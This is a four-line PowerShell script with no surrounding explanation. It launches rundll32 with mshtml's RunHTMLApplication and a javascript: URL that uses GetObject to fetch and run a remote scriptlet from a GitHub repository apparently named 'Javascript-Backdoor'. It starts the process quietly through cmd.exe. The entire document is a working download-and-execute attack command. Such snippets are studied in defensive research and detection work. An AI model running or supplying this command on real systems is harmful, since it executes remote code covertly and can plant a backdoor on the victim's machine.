$a="rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();GetObject(`"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test`")"
$msexe="cmd.exe"
$arguments="/c $a"
start-process $msexe $arguments –NoNewWindow
